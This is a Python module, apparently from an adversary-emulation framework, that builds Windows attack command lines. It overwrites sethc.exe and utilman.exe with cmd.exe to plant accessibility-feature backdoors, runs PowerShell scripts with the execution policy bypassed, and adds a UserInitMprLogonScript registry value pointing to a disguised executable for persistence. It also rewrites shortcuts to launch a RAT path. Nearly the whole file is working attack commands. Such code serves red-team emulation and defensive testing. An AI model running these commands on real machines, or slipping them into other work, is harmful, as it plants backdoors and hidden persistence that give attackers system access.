from plugins.adversary.app.commands.command import CommandLine
from typing import Callable, Tuple
from plugins.adversary.app.commands import parsers


def accessFeatA(key_id: int) -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = "cmd.exe /C \"takeown /f C:\\Windows\\System32\\sethc.exe && icacls " \
                   "C:\\Windows\\System32\\sethc.exe /grant administrators:f " \
                   "&& move C:\\Windows\\System32\\sethc.exe " \
                   "C:\\Windows\\System32\\sethc.exe." + str(key_id) + " && copy C:\\Windows\\System32\\cmd.exe " \
                   "C:\\Windows\\System32\\sethc.exe\""
    return CommandLine(command_line), parsers.static.accessFeat


def accessFeatB(key_id: int) -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = "cmd.exe /C \"takeown /f C:\\Windows\\System32\\utilman.exe && icacls " \
                   "C:\\Windows\\System32\\utilman.exe /grant administrators:f " \
                   "&& move C:\Windows\\System32\\utilman.exe " \
                   "C:\\Windows\\System32\\utilman.exe." + str(key_id) + " && copy C:\\Windows\\System32\\cmd.exe " \
                   "C:\\Windows\\System32\\utilman.exe\""
    return CommandLine(command_line), parsers.static.accessFeat

def bypassA() -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = ['powershell', '-executionPolicy', 'Bypass', '-file', "C:\\bypassA.ps1"]
    return CommandLine(command_line), parsers.static.bypassA


def bypassB() -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = ['powershell', '-executionPolicy', 'Bypass', '-file', "C:\\bypassB.ps1"]
    return CommandLine(command_line), parsers.static.bypassB
def logonScriptA() -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = ['reg', 'export', 'HKCU\\Environment', 'C:\\envn.reg']
    return CommandLine(command_line), parsers.static.logonScript

def logonScriptB() -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = ['reg', 'add', 'HKCU\\Environment', '/v', 'UserInitMprLogonScript', '/t', 'REG_SZ', '/d',
                    'C:\\totally_innocent_executable.exe', '/f']
    return CommandLine(command_line), parsers.static.logonScript

def shortcutmodify(target_path: str, rat_path: str) -> Tuple[CommandLine, Callable[[str], None]]:
    command_line = ['powershell', '-ExecutionPolicy Bypass', '-NoLogo', '-NonInteractive', '-NoProfile', '-Command',
                    '"$SHORTCUT=\'' + target_path + '\';$TARGET=\'' + rat_path + '\';$ws = New-Object -ComObject ' +
                    'WScript.Shell; $s = $ws.CreateShortcut($SHORTCUT); $S.TargetPath = $TARGET; $S.Save()"']
    return CommandLine(command_line), parsers.static.shortcutmodify


def cleanupCMD(CleanCmd: str) -> Tuple [CommandLine, Callable[[str], None]]:
    command_line = [CleanCmd]
    return CommandLine(command_line), parsers.static.cleanup